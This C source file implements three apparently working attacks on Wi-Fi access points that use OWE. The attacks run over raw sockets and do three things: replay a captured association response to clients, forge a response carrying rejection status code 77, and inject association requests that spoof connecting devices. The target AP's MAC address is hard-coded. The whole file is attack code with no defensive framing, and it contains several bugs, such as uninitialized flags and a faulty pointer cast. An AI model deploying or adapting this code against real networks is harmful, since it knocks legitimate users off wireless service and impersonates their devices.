#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>

#include "helper.h"
#include "packet.h"
#include "sniff.h"
#include "attack.h"


//
// These filter functions will have to be reworked so that they dinamically can take values abt ap
//
static bool auth_resp_filter(uint8_t *raw_packet)
{
    return (raw_packet[0] == 0xb0 && memcmp(raw_packet + 10, mac_to_bytes("d4:01:c3:1d:d3:be"), MAC_LEN) == 0); //hard corded for ap mac
}

static bool asso_resp_filter(uint8_t *raw_packet)
{
    return (raw_packet[0] == 0x10 && memcmp(raw_packet + 10, mac_to_bytes("d4:01:c3:1d:d3:be"), MAC_LEN) == 0); //hard coded for ap mac
}

static bool asso_req_filter(uint8_t *raw_packet)
{
    return (raw_packet[0] == 0x00 && memcmp(raw_packet + 4, mac_to_bytes("d4:01:c3:1d:d3:be"), MAC_LEN) == 0); //hard coded for ap mac
}

//mb will need to also accept params about interface and target ap
//returns 0 for success
int owe_asso_resp_replay_attack(int raw_socket, const ap_info *ap, const intf_info *intf)
{
    uint8_t ap_asso_resp[BUFFER_SIZE];
    int ap_asso_resp_len = 0;


    base_packet bp = {0};
    auth_part auth_p = {0};

    //set values for base packet
    bp.type = 0xb0; //authentication packet
    bp.duration = 314; //some random duration
    memcpy(bp.src_mac, intf->mac, MAC_LEN);
    memcpy(bp.dest_mac, ap->mac, MAC_LEN);
    memcpy(bp.bssid_mac, ap->mac, MAC_LEN);
    bp.SN = 16;

    //set values for auth part of packet
    auth_p.SEQ = 0x1;

    size_t packet_len;

    uint8_t *auth_packet = create_auth_packet(&bp, &auth_p, &packet_len);

    //try sending out a packet
    int send_size = send(raw_socket, auth_packet, packet_len, 0);
    if (send_size < 0)
    {
        printf("[-] Error sending packet!\n");
        return -1;
    }

    printf("[+] Succesfully sent out the authentication packet!\n");

    uint8_t *auth_response = malloc(BUFFER_SIZE); //this needs to be impproved bcs mostly packets are smaller
    if (auth_response == NULL)
    {
        printf("[-] Couldnt allocate buffer!");
        return -1;
    }

    size_t auth_resp_size = sniff(raw_socket, auth_response, auth_resp_filter, 50); //arbitrary packet limit

    bool authenticated;

    if (auth_resp_size > 0)
    {
        //kind of throaway variable
        auth_part *a = (auth_part *) auth_response + auth_response[2] + sizeof(base_packet);
        if (a->status_code == 0x0000)
        {
            authenticated = true;
        } else {
            authenticated = false;
        }
    }

    if (authenticated)
    {
        printf("[+] Succesfully authenticated to the AP\n");

        bp.type = 0x00; //set to association request
        bp.SN += 16;

        asso_part asso_p = {.capabilities = 0x1531, .listen_interval = 0x000a};

        size_t packet_len;

        uint8_t *asso_packet = create_asso_packet(&bp, &asso_p, ap->ssid, &packet_len);

        int send_size = send(raw_socket, asso_packet, packet_len, 0);
        if (send_size < 0)
        {
            printf("[-] Error sending packet!\n");
            return -1;
        }

        uint8_t *asso_response = malloc(BUFFER_SIZE);
        if (asso_response == NULL)
        {
            printf("[-] Couldnt allocate buffer!");
            return -1;
        }

        size_t asso_resp_size = sniff(raw_socket, asso_response, asso_resp_filter, 50); //arbitrary packet limit

        bool associated;

        if (asso_resp_size > 0)
        {
            if (*(asso_response + asso_response[2] + sizeof(base_packet) + sizeof(uint16_t)) == 0x0000)
            {
                associated = true;
            } else {
                associated = false;
            }
        }


        if (associated)
        {
            printf("[+] This device is now associated to the AP\n");
            memcpy(ap_asso_resp, asso_response, asso_resp_size);
            ap_asso_resp_len = asso_resp_size;

        } else if (asso_resp_size == -1)
        {
            printf("[-] Couldn't find association response packet\n");
        }

        free(asso_response);

    } else if (auth_resp_size == -1)
    {
        printf("[-] Couldn't find authentication response packet\n");
    }

    free(auth_response);

    //**************************************
    //
    //Will need to gracefully deauth from ap
    //
    //**************************************

    printf("[+] Starting attack\n\n");

    uint8_t *packet = malloc(BUFFER_SIZE);
    if (packet == NULL)
    {
        printf("[-] Couldnt allocate buffer!");
        return -1;
    }

    for (;;)
    {
        int packet_len = sniff(raw_socket, packet, asso_req_filter, 0);

        //if found asso req packet
        if (packet_len > 0)
        {
            uint8_t *src_mac = packet + packet[2] + 10;
            memcpy(ap_asso_resp + ap_asso_resp[2] + 4, src_mac, MAC_LEN);

            int send_size = send(raw_socket, ap_asso_resp, ap_asso_resp_len, 0);
            if (send_size < 0)
            {
                printf("[-] Error sending packet!\n");
                return -1;
            }

            printf("[+] Sent out association response packet for device %02x:%02x:%02x:%02x:%02x:%02x\n", 
                src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
        } else return -1;
    }

    return 0;
}

int owe_asso_resp_code_attack(int raw_socket, const ap_info *ap, const intf_info *intf)
{
    uint8_t ap_asso_resp[BUFFER_SIZE];
    int ap_asso_resp_len = 0;


    base_packet bp = {0};
    auth_part auth_p = {0};

    //set values for base packet
    bp.type = 0xb0; //authentication packet
    bp.duration = 314; //some random duration
    memcpy(bp.src_mac, intf->mac, MAC_LEN);
    memcpy(bp.dest_mac, ap->mac, MAC_LEN);
    memcpy(bp.bssid_mac, ap->mac, MAC_LEN);
    bp.SN = 16;

    //set values for auth part of packet
    auth_p.SEQ = 0x1;

    size_t packet_len;

    uint8_t *auth_packet = create_auth_packet(&bp, &auth_p, &packet_len);

    //try sending out a packet
    int send_size = send(raw_socket, auth_packet, packet_len, 0);
    if (send_size < 0)
    {
        printf("[-] Error sending packet!\n");
        return -1;
    }

    printf("[+] Succesfully sent out the authentication packet!\n");

    uint8_t *auth_response = malloc(BUFFER_SIZE); //this needs to be impproved bcs mostly packets are smaller
    if (auth_response == NULL)
    {
        printf("[-] Couldnt allocate buffer!");
        return -1;
    }

    if (auth_response == NULL)
    {
        printf("[-] Couldnt allocate buffer!");
        return -1;
    }

    size_t auth_resp_size = sniff(raw_socket, auth_response, auth_resp_filter, 50); //arbitrary packet limit

    bool authenticated;

    if (auth_resp_size > 0)
    {
        //kind of throaway variable
        auth_part *a = (auth_part *) auth_response + auth_response[2] + sizeof(base_packet);
        if (a->status_code == 0x0000)
        {
            authenticated = true;
        } else {
            authenticated = false;
        }
    }

    if (authenticated)
    {
        printf("[+] Succesfully authenticated to the AP\n");

        bp.type = 0x00; //set to association request
        bp.SN += 16;

        asso_part asso_p = {.capabilities = 0x1531, .listen_interval = 0x000a};

        size_t packet_len;

        uint8_t *asso_packet = create_asso_packet(&bp, &asso_p, ap->ssid, &packet_len);


        //Modify the asso_packet so that theres no pub key in owe field
        //By doing this, the ap won't include the owe element in it's response which is convenient
        //Keeps the ext_tag_number and group field which in total is 3 bytes
        uint8_t *p = asso_packet + asso_packet[2] + sizeof(base_packet) + sizeof(asso_part);
        while (p < asso_packet + packet_len)
        {
            //check if type is owe (type = 255 and tagnumber = 32)
            if (*p == 255 && *(p+2) == 32)
            {
                int offset = 3 * sizeof(uint8_t); //for the offset mentioned above

                p++; //p now points to len
                uint8_t *q = p + 1 + *p; //place after owe field

                //shift the rest of the packet after len field
                if (q < asso_packet + packet_len)
                    memcpy(p + 1 + offset, q, asso_packet + packet_len - q);
                
                packet_len -= *(p) - offset; //reduce len of packet by the pub key length
                *p = offset; //set len to 1 -> only ext tag number field
                break;
            } else
            {
                p++; //p now points to the len field
                p += *p + 1; //set p to next field.
            }
        }

        int send_size = send(raw_socket, asso_packet, packet_len, 0);
        if (send_size < 0)
        {
            printf("[-] Error sending packet!\n");
            return -1;
        }

        uint8_t *asso_response = malloc(BUFFER_SIZE);
        if (asso_response == NULL)
        {
            printf("[-] Couldnt allocate buffer!");
            return -1;
        }

        if (asso_response == NULL)
        {
            printf("[-] Couldnt allocate buffer!");
            return -1;
        }

        size_t asso_resp_size = sniff(raw_socket, asso_response, asso_resp_filter, 50); //arbitrary packet limit

        bool associated;

        if (asso_resp_size > 0)
        {
            // no need to check for whether im associated or not
            printf("[+] Succesfully got the AP association response\n");
            memcpy(ap_asso_resp, asso_response, asso_resp_size);
            ap_asso_resp_len = asso_resp_size;

        } else if (asso_resp_size == -1)
        {
            printf("[-] Couldn't find association response packet\n");
        }

        free(asso_response);

    } else if (auth_resp_size == -1)
    {
        printf("[-] Couldn't find authentication response packet\n");
    }

    free(auth_response);

    //**************************************
    //
    //Will need to gracefully deauth from ap
    //
    //**************************************

    printf("[+] Starting attack\n\n");

    //Modify the ap_asso_resp packet so that it's association success code is 77
    *(ap_asso_resp + ap_asso_resp[2] + sizeof(base_packet) + sizeof(uint16_t)) = 77;


    uint8_t *packet = malloc(BUFFER_SIZE);
    if (packet == NULL)
    {
        printf("[-] Couldnt allocate buffer!");
        return -1;
    }

    for (;;)
    {
        int packet_len = sniff(raw_socket, packet, asso_req_filter, 0);

        //if found asso req packet
        if (packet_len > 0)
        {
            uint8_t *src_mac = packet + packet[2] + 10;
            memcpy(ap_asso_resp + ap_asso_resp[2] + 4, src_mac, MAC_LEN);

            int send_size = send(raw_socket, ap_asso_resp, ap_asso_resp_len, 0);
            if (send_size < 0)
            {
                printf("[-] Error sending packet!\n");
                return -1;
            }

            printf("[+] Sent out association response packet for device %02x:%02x:%02x:%02x:%02x:%02x\n", 
                src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
        } else return -1;
    }

    return 0;
}

int owe_asso_req_attack(int raw_socket, const ap_info *ap)
{
    //create base_packet for association request
    base_packet bp = {0};

    bp.type = 0x00; //set to association request
    bp.duration = 314; //some random duration
    memcpy(bp.dest_mac, ap->mac, MAC_LEN);
    memcpy(bp.bssid_mac, ap->mac, MAC_LEN);
    bp.SN = 32;

    asso_part asso_p = {.capabilities = 0x1531, .listen_interval = 0x000a};

    size_t asso_packet_len;

    uint8_t *asso_packet = create_asso_packet(&bp, &asso_p, ap->ssid, &asso_packet_len);


    uint8_t *packet = malloc(BUFFER_SIZE);
    if (packet == NULL)
    {
        printf("[-] Couldnt allocate buffer!");
        return -1;
    }

    printf("[+] Starting attack\n\n");

    for (;;)
    {
        int packet_len = sniff(raw_socket, packet, auth_resp_filter, 0);

        //if found asso req packet
        if (packet_len > 0)
        {
            uint8_t *dest_mac = packet + packet[2] + 4;
            memcpy(asso_packet + asso_packet[2] + 10, dest_mac, MAC_LEN);

            int send_size = send(raw_socket, asso_packet, asso_packet_len, 0);
            if (send_size < 0)
            {
                printf("[-] Error sending packet!\n");
                return -1;
            }

            printf("[+] Sent out association request packet for device %02x:%02x:%02x:%02x:%02x:%02x\n", 
                dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5]);
        } else return -1;
    }
}